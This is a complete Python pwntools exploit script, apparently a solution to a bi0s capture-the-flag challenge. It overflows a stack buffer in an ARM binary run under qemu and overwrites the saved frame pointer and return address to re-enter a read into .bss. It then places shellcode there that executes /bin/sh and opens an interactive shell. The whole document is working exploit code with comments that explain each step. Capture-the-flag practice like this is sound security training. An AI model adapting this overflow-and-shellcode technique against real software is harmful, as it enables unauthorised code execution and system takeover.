#!/usr/bin/env python

from pwn import *

with context.quiet:
    p = process('qemu-arm -L ./ ./program', shell=True)

    p.recvuntil('Welcome to bi0s CTF!\n')

    bss = 0x21034

    # replace the return address (pc) with address of the read snippet, so we can execute the read again
    # we also set the "saved fp" in a way that we can influence the buf the read uses
    p.sendline(
        # garbage
        'a' * 0x64 + \
        # saved fp. it points to somewhere in .bss
        p32(bss + 0x100 + 0x68) + \
        # this is the address of start of read call
        p32(0x1052c)
    )

    shellcode = asm('''
        add r0, pc, #12
        mov r1, #0
        mov r2, #0
        mov r7, #11
        svc #0

        .ascii "/bin/sh\\0"
    ''', arch='arm', os='linux')

    p.sendline(
        # the shellcode we jump to later
        shellcode + \
        # we write garbage the rest of it
        'a' * (0x64 - len(shellcode)) + \
        # we overwrite the place for saved fp with 0. it does not matter what we write here
        p32(0) + \
        # we set the return address (pc) the beginning of the shellcode
        p32(bss + 0x100)
    )

    p.interactive()

